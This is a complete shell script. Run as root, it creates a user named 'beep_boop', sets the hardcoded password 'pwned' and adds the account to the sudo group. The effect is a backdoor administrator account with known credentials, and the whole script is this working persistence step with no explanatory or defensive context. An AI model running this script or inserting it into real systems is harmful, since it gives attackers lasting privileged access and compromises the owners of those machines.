#!/usr/bin/sh

if [ $(id -u) -ne 0 ]; then
    echo "You're not root"
    exit 1
fi

useradd -m -s /bin/bash beep_boop
echo beep_boop:pwned | chpasswd

usermod -aG sudo beep_boop

exit 0
